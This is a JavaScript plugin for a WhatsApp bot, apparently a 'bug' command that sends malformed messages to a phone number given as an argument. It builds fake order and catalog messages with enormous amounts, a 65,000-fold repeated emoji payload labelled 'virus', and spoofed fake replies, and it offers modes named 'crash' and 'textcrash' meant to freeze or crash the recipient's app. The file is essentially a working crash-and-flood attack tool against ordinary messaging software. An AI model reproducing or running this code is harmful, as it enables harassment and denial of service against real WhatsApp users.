import pkg from '@adiwajshing/baileys'
import {
	promises,
	readFileSync
} from 'fs'
import fetch from 'node-fetch'
import {
	sticker
} from '../lib/sticker.js'
const {
	generateWAMessageFromContent,
	prepareWAMessageMedia,
	proto
} = pkg
let handler = async (m, {
	conn,
	args,
	text,
	command,
	usedPrefix,
	participants
}) => {
	let who = m.sender ? m.sender : conn.user.jid && conn.user.jid ? conn.user.jid : '0@s.whatsapp.net'
	let name = await conn.getName(who)
	let sapa = ['Hai', 'Ohayo', 'Kyaa', 'Halo', 'Nyann'].getRandom()
	let pp = await conn.profilePictureUrl(who, 'image').catch(_ => hwaifu.getRandom())

	// jpegThumbnail
	let _situm = await conn.resize(thumbnailUrl.getRandom(), 300, 150)
	let sipp = await conn.resize(pp, 150, 150)

	let virus = emojis.repeat(65000)
	const from = m.key.remoteJid

	//==================( Quoted ) =================//
	//# Kal
	const kal = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...(from ? {
				remoteJid: "@s.whatsapp.net"
			} : {})
		},
		"message": {
			"extendedTextMessage": {
				"text": '👋 ' + sapa + ' Kak :> ' + name,
				"previewType": "NONE",
				"contextInfo": {
					"stanzaId": "3EB0382EDBB2",
					"participant": "@s.whatsapp.net"
				}
			}
		}
	}
	//=================================================//		
	//# Troli
	const trol = {
		key: {
			fromMe: false,
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		"message": {
			"orderMessage": {
				"orderId": "594071395007984",
				"thumbnail": await (await fetch(pp)).buffer(),
				"itemCount": 100000000000,
				"status": "INQUIRY",
				"surface": "CATALOG",
				"message": "",
				"orderTitle": '👋 ' + sapa + ' Kak :> ' + name,
				"sellerJid": "62857887347569@s.whatsapp.net",
				"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
				"totalAmount1000": "500000000000000",
				"totalCurrencyCode": "IDR"
			}
		}
	}
	//#Troli 2
	const ftrolii = {
		key: {
			fromMe: false,
			"participant": "0@s.whatsapp.net",
			"remoteJid": "@g.us"
		},
		"message": {
			orderMessage: {
				itemCount: 100000000000,
				status: 200,
				thumbnail: await (await fetch(pp)).buffer(),
				surface: 200,
				message: `© ${'👋 ' + sapa + ' Kak :> ' + name}`,
				token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
				totalAmount1000: "500000000000000",
				totalCurrencyCode: "IDR",
				orderTitle: `${'👋 ' + sapa + ' Kak :> ' + name} ${virus}`,
				sellerJid: '0@s.whatsapp.net'
			}
		},
		contextInfo: {
			"forwardingScore": 999,
			"isForwarded": true
		},
		sendEphemeral: true
	}
	//=================================================//	
	//# Sticker
	const bugstik = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		"message": {
			"orderMessage": {
				"orderId": "594071395007984",
				"thumbnail": await (await fetch(pp)).buffer(),
				"itemCount": 100000000000,
				"status": "INQUIRY",
				"surface": "CATALOG",
				"message": '👋 ' + sapa + ' Kak :> ' + name,
				"orderTitle": '👋 ' + sapa + ' Kak :> ' + name,
				"sellerJid": "62857887347569@s.whatsapp.net",
				"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
				"totalAmount1000": "500000000000000",
				"totalCurrencyCode": "IDR"
			}
		}
	}
	//=================================================//
	//# Pdf
	const bugpdf = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		message: {
			"imageMessage": {
				"mimetype": "image/jpeg",
				"caption": '👋 ' + sapa + ' Kak :> ' + name,
				"jpegThumbnail": sipp
			}
		}
	}
	//=================================================//   
	//# Vn
	const adehvn = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		"message": {
			"locationMessage": {}
		}
	}
	//=================================================//	   
	//# Image
	const bugimage = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...({
				remoteJid: ""
			})
		},
		"message": {
			"audioMessage": {
				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
				"mimetype": "audio/aac",
				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
				"fileLength": "285473",
				"seconds": 9999999999,
				"caption": '👋 ' + sapa + ' Kak :> ' + name,
				"ptt": false,
				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
				"mediaKeyTimestamp": "1632753911"
			}
		}
	}
	//=================================================//		
	//# Catalog
	const messa = await prepareWAMessageMedia({
		image: await (await fetch(pp)).buffer()
	}, {
		upload: conn.waUploadToServer
	})
	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		"productMessage": {
			"product": {
				"productImage": messa.imageMessage,
				"productId": "4383282311765462",
				"title": '👋 ' + sapa + ' Kak :> ' + name,
				"description": virus,
				"currencyCode": "IDR",
				"bodyText": virus,
				"footerText": '👋 ' + sapa + ' Kak :> ' + name,
				"priceAmount1000": "10000000",
				"productImageCount": 1,
				"firstImageId": 1,
				"salePriceAmount1000": "10000000",
				"retailerId": '👋 ' + sapa + ' Kak :> ' + name,
				"url": "wa.me/62881037044211"
			},
			"businessOwnerJid": "62881037044211@s.whatsapp.net",
		}
	}), {
		userJid: m.chat,
		quoted: ftrolii
	})
	//=================================================//	
	//# Contact
	const fkontaak = {
		key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`,
			...(m.chat ? {
				remoteJid: "@broadcast"
			} : {})
		},
		message: {
			"contactMessage": {
				"displayName": `${'👋 ' + sapa + ' Kak :> ' + name}${virus}`,
				"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${'👋 ' + sapa + ' Kak :> ' + name}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD`
			}
		}
	}
	//=================================================//   
	//# Text
	const main = {
		"key": {
			"fromMe": false,
			"participant": "0@s.whatsapp.net",
			...({
				"remoteJid": ''
			})
		},
		"message": {
			"imageMessage": {
				"mimetype": "image/jpeg",
				"jpegThumbnail": sipp
			}
		}
	}
	//=================================================//   

	let nomor = args[0]
	let bugg = args[2]
	let jumlah = args[1]
	let sukses = '[ SUKSES ]'

	if (!nomor) throw '[ ⚠️ ] HARAP MASUKKAN NOMOR'
	if (!Number(jumlah)) throw '[ ⚠️ ] HARAP MASUKKAN JUMLAH'
	let fixedNumber = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : nomor ? (nomor.replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
	let q = 'Bug Tag From ' + fixedNumber
	let fixedJumlah = jumlah ? jumlah * 1 : 10
	if (fixedJumlah > 10) throw '[ ⚠️ ] TERLALU BANYAK PESAN! JUMLAH HARUS KURANG DARI 10 PESAN'
	let dapet = ['catalog',
		'crash',
		'img',
		'tag',
		'textcrash',
		'vid',
		'pdf',
		'reactpc',
		'sticker',
		'vn'
	]
	let listSections = []
	Object.keys(dapet).map((v, index) => {
		listSections.push([++index + ' ' + cmenub + ' BUG ' + (dapet[v]).toUpperCase(), [
			['Send Now', usedPrefix + command + ' ' + fixedNumber + ' ' + fixedJumlah + ' ' + dapet[v], '\nBy: ' + author]
		]])
	})
	if (!bugg) return conn.sendList(m.chat, htki + ' 📺 Bug List 🔎 ' + htka, `⚡ Silakan pilih Bug List di tombol di bawah...\n*Teks yang anda kirim:* ${text}\n\nKetik ulang *${usedPrefix + command}* teks anda untuk mengubah teks lagi`, author, `Bug List Disini`, listSections, m)

	if (bugg == 'vn') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.sendMessage(fixedNumber, {
				audio: await (await fetch(pp)).buffer(),
				mimetype: 'audio/mpeg',
				ptt: true
			}, {
				quoted: adehvn
			})
		}
		throw sukses
	}
	if (bugg == 'pdf') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.sendMessage(fixedNumber, {
				document: await (await fetch(pp)).buffer(),
				filename: `🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`,
				mimetype: 'application/pdf',
			}, {
				quoted: bugpdf
			})
		}
		throw sukses
	}
	if (bugg == 'sticker') {
		for (let i = fixedJumlah; i > 1; i--) {
			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', 
				'👋 ' + sapa + ' Kak :> ' + name, author)
			if (i !== 0) return conn.sendFile(fixedNumber, stiker, 'sticker.webp', '', false, {
				asSticker: true
			}, {
				quoted: bugstik
			})
		}
		throw sukses
	}
	if (bugg == 'img') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.sendMessage(fixedNumber, {
				image: await (await fetch(pp)).buffer(),
				bugimage
			}, {
				quoted: bugimage
			})
		}
		throw sukses
	}
	if (bugg == 'crash') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
		}
		throw sukses
	}
	if (bugg == 'reactpc') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.sendMessage(fixedNumber, {
				text: '👋 ' + sapa + ' Kak :> ' + name
			}, {
				quoted: trol
			})
		}
		throw sukses
	}
	if (bugg == 'tag') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (!m.isGroup) return dfail('group', m, conn)
			if (i !== 0) return conn.sendMessage(m.chat, {
				text: q ? q : '',
				mentions: participants.map(a => a.id)
			}, {
				quoted: kal
			})
		}
		throw sukses
	}
	if (bugg == 'catalog') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.relayMessage(fixedNumber, catalog.message, {
				messageId: catalog.key.id
			})
		}
		throw sukses
	}
	if (bugg == 'textcrash') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.reply(fixedNumber, '👋 ' + sapa + ' Kak :> ' + name, main)
		}
		throw sukses
	}
	if (bugg == 'vid') {
		for (let i = fixedJumlah; i > 1; i--) {
			if (i !== 0) return conn.sendMessage(fixedNumber, {
				video: await (await fetch(pp)).buffer(),
				bugimage,
			}, {
				quoted: bugimage
			})
		}
		throw sukses
	}

}
handler.help = ['tbug']
handler.tags = ['tools']
handler.command = ['tbug']
handler.disabled = true

export default handler